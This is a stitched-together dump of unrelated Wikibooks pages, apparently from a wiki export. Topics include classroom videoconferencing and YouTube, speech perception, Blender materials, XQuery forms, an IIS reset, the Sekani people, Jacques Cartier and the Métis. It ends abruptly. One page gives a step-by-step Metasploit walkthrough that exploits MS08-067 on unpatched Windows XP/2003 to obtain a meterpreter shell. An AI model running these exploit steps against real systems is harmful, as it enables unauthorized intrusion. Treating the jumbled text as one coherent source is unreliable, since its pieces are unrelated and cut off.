The costs of each device have different price ranges.  The cost of the desktop can cost as low as $300 [[source:IVCi]][http://www.vsgi.com/google/landing/videosys],  the  cost of the set-up device which is the portable unit can range anywhere between $5000 to $10,000 [[source: IVCi]][http://www.vsgi.com/google/landing/videosys]and the last device which will cost schools more money than they are will to spend is the integrated codec and the price range from $10,000 to $100,000 [[source: IVCi]][http://www.vsgi.com/google/landing/videosys].  

After looking into several schools, it seems that most of the schools are using the portable units because they are able to move them from one classroom to another classroom.  With the school budgets today, there has to be a medium for the schools to chose what will work better for them at the less cost out of pocket.

== Diagram to Illustrate Videoconferencing ==

[[File:VCdiagram.jpg|upright|1000x2000px]]
== Tips When Using Video Conferencing ==

When using video conferencing in a classroom setting or any other setting one must be prepared and have done some advance preparation  and testing in order to make the conference rewarding for the students.   According to Jobe who quoted “Phil Stauder who uses videoconference extensively with his students at DuPont Hadley Middle School in Nashville, Tennessee, offers this advice.
::•Plan your conference for early in the day so the Internet is less congested.
::•Explain to everyone in your building that you need all the bandwidth you can get. Request they stay off-line during your scheduled conference.    
::•Decide on the placement of students on camera.  You will need to use an external microphone due to their distance from the computer.
::•Use a direct connection to your partner if possible.  Experiment with their calling you and then your calling them; the connection may vary.
::•Do trial runs with your students, so everyone knows when to speak and when to listen.  You might do this within your building; it is a great way to share problem-solving activities or to do a remote spelling bee.
::•Plan for the worst!  If the server is down, postpone.  Running your e-mail program in the background is a good idea, also having a telephone at your disposal with all the participants; numbers is helpful.
::•Beware of unexpected incoming hook-up requests when you are on-line; if students are present; choose not to answer incoming requests (Jobe, 1999).

When people get new technology they are so eager to start using it immediately, but with video conferencing it is not the best recommendation.  Students or teachers can type in a site address without contacting the other site can expose students to undesirable content.   Organization is everything. 

Here are a few links with ideas and tools about using video conferencing within schools.

== Benefits of using Video Conferencing ==

Videoconferencing has many benefits and advantages for students in K-12 classrooms.  There is an article by [[Virginia Ewing (2005)]][http://www.distance-educator.com/dnews/modules.php?file=article&amp;name=News&amp;op=modload&amp;sid=13828], which states “videoconferencing in the K-12 classroom is advantageous because it enhances the learning process, increases student motivation and participation, and encourages cultural diversity.”  There are several benefits for using IVC which will be listed below and there are many more that will not be listed, but this will give you an idea.

::•IVC will bring experts otherwise may not have been available or accessible into the K-12 classrooms
::•It will appeal to students different learning styles
::•Different  schools can collaborate with each to learn about each other’s cultures and background
::•IVC will help to improve communication and presentation skills of the students
::•IVC will open the minds of students to different location outside of their hometown and to think outside of the box
::•It will improve collaborations between schools and teachers


Many schools are using IVC to allow students to take courses that are not offered in their area and it also allows schools who cannot afford certain teachers such as Math and Science teachers to transmit lessons from other classrooms.   Video conference provides equal access to high quality teachers to improve students’ achievement in the school district.   

Regardless of delivery method, technology should:

:#Encourage contact between students and faculty
:#Develop reciprocity and cooperation among students
:#Use active learning techniques
:#Give prompt feed back
:#Emphasize time on task
:#Communicate high expectations
:#Respect diverse talents and ways to learning

(as cited in Beldarrain, 2006, p. 142).  If teachers adhere to the seven principles, the implementation of video conferencing can be proactive which will benefit the learners and educators in classroom and outside the classroom.


== Final Thoughts ==

Teachers will need or may have to rise above the standard way of teaching K-12 schools and start to embrace the benefits of using video conferencing as another pedagogy method.   The use of video and audio to enhance student learning is such a broad scope and interesting concept to look into.  It will be amazing to see how schools will start to incorporate video conferencing into each classroom.  It will be an exciting thing and extraordinary for the students and teachers.  The question now is how will existing educators within the school system adjust and welcome the new change?  Will teachers start to feel threaten by technology as it slowly creeps into the schools?  How will schools keep up with the new technology with the limited budget they are given.  How often and how much will schools use video conferencing for educating students.  With the way researchers are discovering new technology for learning, educators should be very excited about the future in education.

      <comment>/* Speech spectrogram */</comment>
      <text xml:space="preserve">Speech perception is a hot topic because it is critically important to human communication. As well, there are some controversial claims being made. For example, it may be the case that we have two auditory systems: one for speech, one for non-speech.

==The nature of speech sounds==
The stream of speech sounds is relatively unbroken during normal, fluent speech. There is no space between the words - detecting word boundaries is a major problem for psycholinguistics.

The [[w:International Phonetic Alphabet|International Phonetic Alphabet]] is an alphabet which ''does'' uniquely identify every speech sound by a single character. IPA symbols will be used extensively in this section; you would do well to familiarize yourself with the symbols, and their use.

===Definitions===
;phoneme:The smallest unit of linguistically distinctive sound. Phonemes are not the same thing as letters, morphemes, nor syllables.
;letter:An element of written language. It is critically important that there is no &lt;math&gt;1:1&lt;/math&gt; relationship between letters of the alphabet and the phonemes of the language.
;morpheme:The smallest linguistic unit that has semantic meaning. ''Work'' is a morpheme; ''-ed'' is another morpheme. ''Worked'' is two morphemes.
;utterance:A complete unit of spoken language.

===Structure of language===
There are four rough levels of the analysis of language. Beginning from the highest level:
*Syntactic - the utterance has a grammatical structure
*Semantic - a string of phonemes has a particular meaning
*Phonetic - a sound is a string of phonemes
*Acoustic - a sound has certain properties

While the bottom-up processes are obvious, there is significant top-down influence as well. For example, the [[w:phonemic restoration effect|phonemic restoration effect]] is very robust, and similar processes can repair input at the level of individual phonemes, words, and even sentences.

If you replace a single phoneme in a sentence with white noise, or a cough, or silence, listeners can still identify the word.

In the sentence &quot;I scream, you scream, we all scream for ice cream.&quot; there is no difference between the /aɪ/ in &quot;I scream&quot; and in &quot;ice cream&quot; - the sound is ''exactly'' the same in both cases, yet the word boundary is perceived to be in a different location based solely on context effects.

If you insert a semantically unrelated sentence into a paragraph-length discourse, listeners will not get it (but will continue with normal perception after the sentence).

==Measuring speech==
===Speech spectrogram===
[[File:Spectrogram of I owe you.png|thumb|A speech spectrogram of &quot;I owe you.&quot;]]
A speech spectrogram (careful with terminology here!) graphs frequency vs time &amp; the intensity (amplitude, loudness) is coded by darkness. This shows qualitatively how speech sounds unfold over time. Note that consonants are noisy (not loud! but broadband in frequency). Vowels, in contrast have prototyped horizontal bands of energy. These bands are called [[w:formant|formants]]. Near consonants, one or more of the formant curves - this is a formant transition. Most vowels are steady-state; they do not change over time (monophthongs). Some vowel sounds are dipthongs - they transition from one spectrum to another over the course of the vowel.
[[File:Spectrogram -iua-.png|thumb]]
However, the speech spectrogram isn't very helpful since it is not ''quantitative''. For that, we can use a ''speech spectrum'' (careful with terminology!).

===Speech spectrum===
A speech spectrum plots energy in dB SPL vs frequency for a short period of time: on the order of 40ms. This is essentially a cross-sectional slice of a speech ''spectrogram''. But now you can't see how the sound unfolds over time!

===Waterfall plot===
A waterfall plot is essentially a series of speech spectrums over time, laid out in 3D. This overcomes the limitations of speech spectrograms (shows speech unfolding over time, but isn't quantitative) and also overcomes the limitations of speech spectrums (highly qualitative, but shows only a short snippet of the speech stream).

==Introduction==  

The Basics:
YouTube has pretty much become the standard in free Internet video uploading.  Perhaps it was solidified by the CNN/YouTube debates during the presidential primaries.  In any case, the use of YouTube has now become so pervasive that it is acceptable for use in the classroom.  It’s important to understand as a technical support specialist that although the teachers in one’s school may be innovative pedagogues, when it comes to incorporating new technologies into lessons, technical support and even prodding is often needed.  The goal of this entry is to provide technical specialists with the knowledge of how to help instructors incorporate the use of YouTube into the classroom.  It also provides some guidelines and cautions.  Often instructors have trepidations about using anything Internet related in their classrooms for fear of safety.  Used properly though, YouTube can be a useful instructional tool in the classroom.

What it is:
What is YouTube in the classroom?  YouTube is probably useful for all types of information.  According to Talab and Butler, you can find all kinds of instructional videos on YouTube, even how to install a hard drive on a Mac.  However, it is particularly well suited to the instruction of the performing and visual arts.  That is what this section of the Wikibook is dedicated to.  

Why:
Why should YouTube be used?  The ability to have a universal platform for students to access information, review lessons, and more is invaluable.  And as far as the world of education is concerned, is unprecedented.  It would be wasteful not to take advantage of this tool.  But first, education technical specialists have to push teachers to be early adapters.  That requires a knowledge of how the site it can be used in instruction, what precautions to take, and how to communicate with the subject area teachers. 


==Example Subjects YouTube Can Be Used For==

==Dance==

Learning Steps:
Dance, like anything physical, requires constant practice to acquire muscle memory.  In order to achieve the most muscle memory as possible, rehearsing and practicing is key.  However, students need to practice the correct steps with the correct techniques, or they are merely achieving muscle memory for the wrong things.  (This then takes extra practice time to un-learn).  YouTube can be used to mitigate this difficulty by providing dance students with an accurate representation of the steps and techniques they need to learn.  Instructors at your school can easily upload short instructional videos to the YouTube site so that when students go home to work on the choreography, they are actually practicing the correct steps and techniques.  These steps can also be homework for students to learn.  Rather than using valuable class time to teach difficult steps, instructors can upload demonstrations and have students come to class prepared with the step.  This saves class time for other important things like staging and working on getting the group to dance in unison.

Improving Choreography:
A major part of the dance teacher’s job is choreographing pieces for students.  But when an instructor is busy working on the minute details of a performance, it’s easy to overlook problems with choreography and miss opportunities for improving the original vision.  YouTube provides a platform by which instructors can study their work from any computer with Internet access and improve their work, thus enhancing the students’ later performance.  Even if they do not use the site themselves, they can send it to colleagues all over the world for input.  Having another professional’s eye can be a great resource in creating choreography.  YouTube can be the mechanism for this self-review and review from other professionals.  

Aside from uploading one’s own videos, instructors can also search for ideas.  From song choices, to choreography, staging, and costuming—teachers can look to other performances on YouTube for inspiration and concrete examples.  They can also find what other students are doing who are at the same age and ability level as their own students.  Using those examples, they can motivate their students to work harder and try more difficult steps.

A Tool for Practicing:
Students can also view an entire routine and practice up to speed with videos uploaded to the site.  Instructors are not limited to posting only one step at a time.  Entire routines can be loaded for students to study how the pieces of choreography fit together as well as spacing.  Furthermore, seeing oneself on a video can help the individual student make adjustments to their techniques, improving themselves before the final performances and pushing their dancing to new levels.

Sharing the Performances:
Many hours, often hundreds of hours, are spent on preparing students for a single ninety-second performance.  Inevitably all of their family and friends cannot be there to share every performance for which the students work so hard.  YouTube’s pervasiveness can be used to the students’ and instructors’ advantage once again in sharing the performances with family, friends, and other professionals.  It’s necessary for students to share their work so that they can have a product of which they can be proud.  Linking their YouTube performance videos to social networking sites and sending it to far away relatives in friends via e-mail is a great way for students to share their performances with others.  Since YouTube videos are viewable through a simple web link, their work is highly accessible.  The more instructors that post videos of their students’ performances, the more that will be available on YouTube for other instructors to view.  This further enhances the entire process, whereby instructors can get inspiration from the work of other schools.  YouTube, with as popular as it’s become, can act as a virtual portfolio for student work.  With dance a portfolio is normally difficult as it is usually captured in real time.  However, YouTube makes it accessible.

Dancing Concluded:
It’s obvious that dance teachers in schools can use YouTube as a tool for learning new steps, sharing performances, enhancing choreography, and giving all students access to practice materials.  As an example, the various ways YouTube can be used to teach dance are documented on this video.[http://www.youtube.com/watch?v=S4yz3HNTYkk]

==Art==

Techniques:
The archetypal distance learning in art is probably Bob Ross’s public television show.  Art teachers can create the same type of experience in K-12 settings.  Classroom teachers can provide instructions, techniques, slide shows, and more for their students to view at home or in the classroom.  Descriptions of techniques in painting, drawing, sculpture, design and more can already be found on YouTube.  Teachers can use what is already there or add their own video.

An example of using YouTube to teach painting can be found here[http://www.youtube.com/watch?v=Qe33o8ezVfI]

Displaying Student Work
Just as with dance, YouTube can be used to showcase student work.  Creating a slide show of exemplary pieces students made in class is a great way to reward students for their hard work as well as give the instructor a permanent example to show subsequent classes.  

==Music==
A classic difficulty with music in the schools is finding time for one-on-one instruction with students.  Working on individual student’s embouchure (for the wind instruments), learning new notes, music theory, and other techniques is a must for music teachers attempting to improve the quality of their overall ensemble.   Short instructional clips online for vocal and instrumental techniques can be a great use of multimedia to improve the overall level of the musical group.  

As with dance, musical performances are particularly suited to video recording to capture the entire experience.  Students can share these with family and friends.  Teachers can use performance videos to motive and critique everything from posture, rhythm, and pitch.  YouTube videos provide students with their own accessible copy of the performances so they can actually refer to it and watch their improvements over time.

==Example Subjects Concluded==

In all three of these performing arts subjects practicing and performing are essential parts of the student experience.  YouTube can serve as a multimedia aid to help students practice more effectively and share final products.  Just as was mentioned by Jeffrey Gentry, YouTube solves the question of bandwidth.  Emailing full videos is normally out of the question for their large file sizes; but YouTube solves that problem as well as other compatibility issues instructors often may have run into.

==Recruitment and Retention==
YouTube videos can also be used for recruitment and retention purposes.  Getting students interested and motivated to participate in the performing arts can often be a struggle.  Traditional promotional videos are costly.  However, teachers can use their recorded dance and music performances as well as artwork slideshows to advertise their programs to the whole school and improve enrollment.  Showing a quick video on the morning announcements can go a long way in attracting new students to a particular program.  Students already participating in the programs will again have a reason to be proud of their work and are likely to continue on.  In this way, these videos can be used for improving retention rates, which can even lead to the increased security of performing arts programs in K-12 institutions that are too often in jeopardy.

==Limitations and Cautions==
If you work as a technical coordinator in education you know that Internet safety is a top priority for teachers, administrators, and parents.  Teachers need to be made aware of the possible problems with using YouTube.  Of course they need to follow YouTube’s terms of service, using only royalty free music and images.  But they also need to protect their students’ privacy.  Full names should not be used; in fact, no identifying information of the children should be used whatsoever.  It would also be prudent to have parents sign a permission release to make sure they are aware of what the teacher intends to do.   Most of the time the instructor will be putting up his or her own videos without students.  In the cases of student performances though, students will inevitably be in the videos.  YouTube has the option to make these videos private so that only the people the instructor allows has access to view the video content.  Many of these issues can be overcome with proper awareness and communication with school administrators and parents.  

==Conclusion==
In short, when used properly, YouTube is a valuable tool for K-12 performance arts educators.  It is the job of the school technical coordinator to help make teachers aware of this resource and help teachers use them appropriately.  

==Challenge!==

1)	What are two ways YouTube can be used to help in teaching the performing arts?

2)	What problems of multimedia sharing does the use of YouTube solve?

3)	What is one way a teacher can help protect a student’s identity in using YouTube with K-12 students?

4)	What performing arts subjects are particularly suited to the use of YouTube for teaching purposes?

==Answers==

1) YouTube can help in learning new techniques, giving examples of entire pieces, sharing final products, and finding inspiration.

2) YouTube solves problems of compatibility of formats and also of bandwidth.

3) Teachers can avoid putting students full names on YouTube, post only videos of the teachers themselves, and get parents permission before using YouTube in the classroom.

4) Dance, music, and art are particularly suited to using YouTube for teaching.

      <text xml:space="preserve">== Plastic is Easy ==
Yes, this page won't actually tell you what you specifically need for plastic, because it's a very simple material. People think too much, so &quot;I&quot; am here to tell you that sometimes the solution is the simplest one.&lt;br&gt;
&lt;br&gt;
'''Hard Plastic''' is made by taking the standard material (the material created when you hit the &quot;Add New&quot; button) and taking the &quot;Hard&quot; Value under the &quot;Shaders&quot; tab and turning it up. You can also turn up the &quot;Spec&quot; Value, also located under the &quot;Shaders&quot; tab.&lt;br&gt;
Nothing to it. Like every other material you can add scratches by making very thin normal maps and very lightly applying them, and maybe make the plastic reflective by turning on a very shallow &quot;RayMir&quot; property.

{{mbox|type=warning|msg=
Thank you for uploading [[:{{#ifeq:{{NAMESPACE:File:Windows 7 desktop.png}}||File:File:Windows 7 desktop.png|File:Windows 7 desktop.png}}]]. However it is missing information needed for compliance with [[w:copyright|copyright law]] and Wikibooks' [[WB:MEDIA|media policy]]. This and other files you have uploaded may soon be deleted unless the '''copyright permissions''' and '''source''' can be determined. If you know this information, then please add the correct [[WB:FILES|templates]] to the [[:{{#ifeq:{{NAMESPACE:File:Windows 7 desktop.png}}||File:File:Windows 7 desktop.png|File:Windows 7 desktop.png}}|description page]] with the copyright and source information included; there is no need to upload it again.

See '''[[Help:Uploading Images]]''' for more. If you have any questions, feel free to contact me, or ask in the [[WB:HELP|assistance reading room]].

See {{UserImages}} for a complete list of your uploads which may get deleted soon.&lt;br/&gt;Thank you. [[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:01, 25 March 2009 (UTC)}}
The same goes for:

* [[:File:Win7 startup screen.jpg]]
* [[:File:Win7 firstuse.jpg]]
* [[:File:Win7 7057 desktop.jpg]]
* [[:File:Mac OSX 10.5 desktop.jpg]]
They seem to be screenshots and thus derivative works of the software they depict. The license needs to comply with the software license or have a suitable fair use rationale. Please see [[Wikibooks:Media]] for more.

The taskbar images,
* [[:File:Win7 taskbar.jpg]]
* [[:File:Win7 taskbar2.jpg]]
seem to be adequately licensed. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:01, 25 March 2009 (UTC)

      <text xml:space="preserve">== A simple manual exploitation using metasploit ==

Assumptions:

* you are using metasploit's latest version and exploits (svn / subversion)
* The target machine is a windows box with windows XP (SP1,SP2,SP3) or Windows 2003 (SP0)
* The target machine has port 445 open (check it via nmap -p 445 &lt;target machine's ip&gt;


Steps:

*1. load msfconsole of metasploit
*2. msf &gt; info exploit/windows/smb/ms08_067_netapi
*3. msf&gt; use exploit/windows/smb/ms08_067_netapi
*4. msf exploit(ms08_067_netapi) &gt; show options
*5. msf exploit(ms08_067_netapi) &gt; set RHOST &lt;target ip&gt;
*6. msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/bind_tcp
*!. You can also use generic/shell_bind_tcp as payload to get a command prompt.
*7. msf exploit(ms08_067_netapi) &gt; set TARGET &lt;choose the target with the corresponding id given via the 'show targets' command &gt;.
*8. msf exploit(ms08_067_netapi) &gt; exploit


If everything goes like this, you will get a meterpreter shell. From there onwards you can do post exploitation stuff ( explained in Post exploitation activities|http://en.wikibooks.org/wiki/Metasploit/post_exploitation)

      <comment>/* Sample CSS File */ nav</comment>
      <text xml:space="preserve">== Motivation ==
You want to store all your code tables in a central location and have each form dynamically generate selection lists from these code tables.

== Method ==
We will create a very simple XML file format to store all our codes.  We will store one code table per file and then write a simple XQuery that goes through all these files to build a sample selection list.  This selection list will create an instance in the model to hold each selection list value.  It will also populate the instance with the first value in the list.

In our sample, we will assume an XRX file naming standard such as '''/db/apps/app-name/code-tables/my-code-table.xml''' where each application contains its own code tables for maximum application portability between systems.  Applications that share code tables can store these in a location such as '''/db/shared/code-tables/my-code-table.xml'''

== Sample Screen Image ==
[[Image:selection-list-generator.jpg|center|frame|Output from Selection List Generator]]

== XML File Format ==
&lt;source lang=&quot;xml&quot;&gt;
&lt;code-table&gt;
    &lt;code-table-name&gt;PublishStatusCode&lt;/code-table-name&gt;
    &lt;definition&gt;A way to classify the publishing workflow of an item.&lt;/definition&gt;
    &lt;items&gt;
        &lt;item&gt;
            &lt;label&gt;Draft&lt;/label&gt;
            &lt;value&gt;draft&lt;/value&gt;
        &lt;/item&gt;
        &lt;item&gt;
            &lt;label&gt;Under Review&lt;/label&gt;
            &lt;value&gt;under-review&lt;/value&gt;
        &lt;/item&gt;
        &lt;item&gt;
            &lt;label&gt;Published&lt;/label&gt;
            &lt;value&gt;published&lt;/value&gt;
        &lt;/item&gt;
    &lt;/items&gt;
&lt;/code-table&gt;
&lt;/source&gt;

== Sample XQuery ==

This query goes through all the files in the XRX application '''code-tables''' collection and looks for XML files that have '''code-table''' as the root element.  It then creates a report that contains all the selection lists inside a working XForms application.

&lt;source lang=&quot;xml&quot;&gt;
xquery version &quot;1.0&quot;;
import module namespace style ='http://code.google.com/p/xrx/style' at '/db/xrx/modules/style.xqm';
declare namespace xhtml=&quot;http://www.w3.org/1999/xhtml&quot;;

(: XQuery to construct an XForm for either a new item or update item :)
declare option exist:serialize &quot;method=xhtml media-type=application/xhtml+xml indent=yes&quot;; 

let $app-collection := style:app-base-uri()
let $code-table-collection := concat($app-collection, '/code-tables')
let $code-tables := collection($code-table-collection)/code-table

return
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; 
xmlns:xf=&quot;http://www.w3.org/2002/xforms&quot; 
xmlns:ev=&quot;http://www.w3.org/2001/xml-events&quot;&gt;
   &lt;head&gt;
      &lt;title&gt;XForms Selection List Tester&lt;/title&gt;
      {style:import-css()}
      &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;block-form.css&quot;/&gt;
      &lt;xf:model&gt;
         &lt;!-- This instance holds the value of each code --&gt;
         &lt;xf:instance xmlns=&quot;&quot; id=&quot;save-data&quot; src=&quot;&quot;&gt;
            &lt;data&gt;
               {for $code-table in $code-tables
                 return
                    element {$code-table/code-table-name/text()} {$code-table/items/item[1]/value/text()}}
            &lt;/data&gt;
         &lt;/xf:instance&gt;
      &lt;/xf:model&gt;
   &lt;/head&gt;
   &lt;body&gt;
      {style:header()}
      {style:breadcrumb()}
      &lt;h1&gt;Sample with a Model in the XForm&lt;/h1&gt;
      {for $code-table in $code-tables
         let $code-table-name := $code-table/*:code-table-name/text()
      return
         &lt;xf:select1 ref=&quot;{$code-table-name}&quot;&gt;
            &lt;xf:label&gt;{$code-table-name}: &lt;/xf:label&gt;
            {for $item in $code-table/*:items/*:item
              return
                 &lt;xf:item&gt;
                    &lt;xf:label&gt;{$item/*:label/text()}&lt;/xf:label&gt;
                    &lt;xf:value&gt;{$item/*:value/text()}&lt;/xf:value&gt;
                 &lt;/xf:item&gt;}
            &lt;xf:hint&gt;{$code-table/*:definition/text()}&lt;/xf:hint&gt;
         &lt;/xf:select1&gt;
      }
      {style:footer()}
   &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

Note that this XQuery uses element constructors to create element names in the instance.  It also uses the '''*:name''' notation to put data from the null namespace directly into the XForms namespace.

This file also puts the definition of the element directly into the hits of the XForms application. Under some XForms applications such as Firefox the hint appears in a floating ephemeral mode display in the left margin of the form.

== Sample CSS File ==

Here is the '''block-form.css''' file that can be used to make each selection appear on a separate line:

&lt;source lang=&quot;xml&quot;&gt;
@namespace xf url(&quot;http://www.w3.org/2002/xforms&quot;);
body {font-family: Arial, Helvetica; sans-serif;}

/* This line ensures all the separate input controls appear on their own lines */
xf|output, xf|input, xf|select, xf|select1, xf|textarea {display:block; margin:5px 0;}

/* Makes the labels right aligned in a column that floats to the left of the input controls. */
xf|select &gt; xf|label,
xf|select1 &gt; xf|label
{text-align:right; padding-right:10px; width:250px; float:left;}
&lt;/source&gt;

      <text xml:space="preserve">[[Image:BitCardLogin.png|thumb|BitCard login screen]]
[[Image:BitCardCPAN.png|thumb|Inept rt.cpan.org home screen after BitCard login]]

'''Bitcard''' is a both archaic unified login protocol, based roughly on TypeKey, and the aptly named proprietary website that functions as the sole provider of BitCard accounts. Unfortunately, the only major services that permit Bitcard is [http://rt.cpan.org rt (CPAN's default bug tracker uses it)], and [http://cpanratings.perl.org/ CPAN ratings].

== RT (CPAN Bug Tracker) ==
When it comes to rt, if you choose to use Bitcard you will have an inept interface that will only permit bug-reporting and ''Search Distributions'' and ''Browse Distributions.''  No one should ever use a Bitcard account: [http://pause.perl.org/pause/query?ACTION=request_id get a pause account] that will allow all of the CPAN bug reporting and in addition the creation of new CPAN modules and distributions.

What exactly won't you be able to do with a Bitcard account? Well, a few of the many features:
*create modules
*edit your tickets by changing the priorities or status
*use advanced queries to find specific tickets
*locate all of the tickets filed by yourself
*collaborate on solving the bugs you reported

If you do use a Bitcard account and want to later submit a module for inclusion into CPAN, or maintain a CPAN module at a later time you will not be able to bring your previous bug reports over into your pause login.

== CPAN Ratings ==
The official CPAN ratings site does not have an alternate login yet. Bitcard is required to rate modules.

== Deleting your Bitcard account ==

You can't... Sorry, got it for life.

The suggest method only restarts one websites hosting process. It is much more contained, and as far as I know can't be easily done with from the command line. MS also provides no ``reload`` functionality like unix daemons to refresh the configuration state without restart.

# From the Start menu, click Run.
# In the Open box, type cmd, and click OK.
# At the command prompt, type iisreset /noforce computername, and press ENTER.
# IIS attempts to stop all services before restarting. The IISReset command-line utility waits up to one minute for all services to stop. If the services cannot be stopped within one minute, all IIS services are terminated, and IIS restarts.

      <text xml:space="preserve">The Sekani - People of the Rocks





A bark lodge present in the few Sekani family that settled in one place more for longer than a week.


Diet:
 



Living in the Rockies, food was hard to come by.  The most common foods were: 

Moose - Moose were one of the most common game in the Sekani area. 
Caribou - Just like moose, Caribou was very common. 
Bear - The Sekani's hunted bear as much as they could manage.  It was very tasty and put up much more of a fight for the hunters. 
Porcupine - Many Sekani's were injured trying to hunt this tricky animal.  It was only after they actually got one that they found out it wasn't very tasty. 
Beaver - Like Porcupine, the only reason that these were hunted would be lack of food or the tough skins that beavers yielded. 
Fish - Fish was the thing the Sekani's hated the most.  It didn't fill them up, and they only hunted fish out of necessity.

The only reason the Sekani did not continually hunt Moose, was because they were in scarce quantities.  Almost everything else was hunted out of hunger.

Most of the Sekani diet was constructed of protein, with very little vegetables present.  Some sources say they ate medicinal herbs, to ease pain or induce sleep.



 
Technology:
 
 
Even though these aren't Sekani hunters, it still give you the general idea of the fishing techniques.

Bow and arrow were the prime hunting weapon, as they provided excellent speed and range.  A common hunting technique would have around 10 hunters all fire arrows aimed at the head of the prey.  This tactic worked very well, except on smaller animals, where accuracy was vital.  They used bow and arrows on fish, where sheer numbers of arrows would be the deciding factor on the kill.

Nets constructed of willow bark or nettle fibre were used to catch fish when they could not find any other food.  They did not use very many boats.  The small lakes iced over enough to allow the nets to be dragged across the lake, yielding plentiful catches of ice fish.  Another effective method was shallow water trident fishing.

The Sekani preferred to use almost every material but stone.  The only things they used stone for were the fishing tridents and the animal hunting arrows and spears.  The most popular material for a blade was a beaver tooth filed to a sharp point.




 
Environment:
 




As the name suggests, these people live in harsh conditions that are the Rocky Mountains, sleeping in caves and open, unprotected brush huts. Although they almost always dwell close to clear, clean rivers, they never bathe in them because they are much too cold.  Even when taking water from such streams, they must bring it into a sheltered area to let it increase in temperature before drinking.  



Most prefer to stay in the plentiful area at the base of the mountain, just a few kilometers from the treeline, where the water is warm and the berries are plentiful.  It is a mystery to most historians why some would choose to stay in the harsh conditions of the upper mountains.  Some suspect that no competition from other tribes would be a great factor in this choice.  Also the fact that the journey up to the upper Rockies is treacherous for large groups of people.





 


The Tse'Khene (Sekani) territory.  If you compare it to the map on the left, it matched exactly with the rocky mountain estimate.  (Tse'Khene is an alternative name for the Sekani.)







A rough area estimate of the Rocky Mountains.


Culture

The Sekani People have their own unique language, yet it is very similar to most Athabaskan languages.  Some very brief rules are listed below:


Tone
Sekani has two tones, low and high. High is the default. That is, syllables normally have high tone. Syllables phonologically marked for tone are low.




Even though most Athapaskan tribes used tattoos, the Sekani People did not.  Paint did not seem to be discluded, as it was freely seen on their ceremonial clothes and headdresses. 
The Sekani People lacked major gods.  Instead, they believed in the connections between man and animals.  They believed that each animal had a minor god associated with it. 
The Sekani's believed that each man had an animal protecting his spirit, and that the traits of that animal were present in that man's abilities.  A man with a black bear spirit would be very strong and have a large build. 
Each band had a shaman.  A shaman was like the witch doctor of the Sekani tribes.  The shaman knew of medicinal herbs and was said to be able to cure illnesses with spirits.  On the flipside, if someone offended a shaman, he could inflict sickness upon the offender.






Clothing: 
 











This Sekani pattern would have showed a family of great status.  Notice the massive amounts of purple dye used in this piece.



The Sekani people used skin from every animal they hunted, including fish.  They found that the skin on the heads of the fish, once dried and sewn together, makes tough, durable shoulder and knee coverings.  The reason this worked for them was because the fish they hunted were used to the cold and had tough, hard skin.

Paint was a major part in clothing for this tribe.  Different colors often showed how rich each family was.  Purple is the most blatant example of this, as purple paint was difficult to come by.  It first had to be harvested from crushed bugs, then cooked at just the right temperature so that it would turn a purple color.  Too long/short to cook would mean that it would turn an ugly brown color, which is the worst possible outcome, because brown was the most common color of paint.

      <comment>/* Jacques Cartier */</comment>
      <text xml:space="preserve">== Jacques Cartier ==
Jaques Cartier departed on his first voyage in 1534. He was in search of a passage to East Asia around North America. After twenty days at sea, he arrived on the coast of Newfoundland. There, he entered the Straight of Belle Island, explored the Bay of St. Lawrence, crossed to the Magdalene Islands and circled Prince Edward Island. In the Chaleur Bay, he met fifty Micmac and returned to their village to celebrate and trade. Disappointed that the bay was not the route to China as Cartier had hoped, he continued onwards. Along the coast of Quebec, Cartier surprised a fishing party of two hundred Hurons headed by Chief Dannaconna. The Hurons welcomed Cartier and he returned to their village. At that point, Cartier decided to sail back to France and bring Donnaconna’s two sons with him: Domagaia and Taignagny. 

The following year, Cartier set forth once more, spurred by rumors of a large river further west. Perhaps this was the route to Asia that evaded him the year before. Cartier sailed to the Huron Village of Stadacona in present day Quebec. Dadaconna greeted him affably, but refused him passage further west. Three Huron medicine men disguised themselves as devils and warned him to travel no further. Cartier laughed and continued heedlessly. Soon, he reached Hochilaga: another Huron village. Extensive festivities followed. A few days later, Cartier decided the St. Lawrence was not the route to China and returned to Stadaconna for the winter. 

Over the winter, Cartier’s men became very ill from scurvy. Out of one hundred and ten men, less than ten were strong enough to look for food. Afraid that the natives might attack them if they discovered that the French were ill, Cartier ordered his men to make a lot of noise as they traveled through the forest. This, he wagered, would make it sound as if the number of hunters were greater. If not for Domagaia, Cartier and his men would probably have perished. Domaigaia, after eating the bark and needles of a white cedar, became healthy once more. He shared this news with Cartier and a week later all of the men were cured. 

Knowing that the French liked tales of riches, the Hurons told storied of a land called Saguenay wealthy in gold and treasures further north. These stories were not true but the French were easily fooled. Cartier headed back to France and kidnapped Dannaconna and his sons so that they could tell these stories to King Francois I. 

Cartier hoped to launch another voyage, this time to find Saguanaya, but was impeded by France’s war with Spain. He was unable to depart until 1541. This time, Cartier was forced to serve under Jean-Francois de la Rocque, sieur de Roberval. The French visited Stadacona and built a fort at the mouth of Saguenay. The men collected what they thought were diamonds and gold, but were in reality quartz and iron pyrite. Cartier wintered at the fort (Charlesbourg-Royal). Over the winter, thirty five men were killed by Hurons angry that the French were setting up fort on tehir land.

The following spring, Cartier met Roberval in Newfoundland. Roberval attempted to convince Cartier to help him continue exploring. Instead, Cartier snuck back to France. There, Cartier remained. He lived in St. Malo and his nearby estate until his death in 1557 at age 66. The areas Cartier discovered would remain largely untouched by Europeans until the next century.

      <text xml:space="preserve">The Métis people are a group of indigenous peoples, and the results of marriages with members of the Saulteaux, Cree, Menominee, Ojibway, Algonquin, and Inuit, to Europeans (mainly French). The Métis are also known as Bois Brûlé, mixed-bloods or half-bloods, or Anglo-Métis. They are one of the three Aboriginal groups in Canada that are officially recognized as a Native group. The Métis live in Central Canada and the Northern United States of America. The word Métis means &quot;mixed race&quot; in French. 


= History =

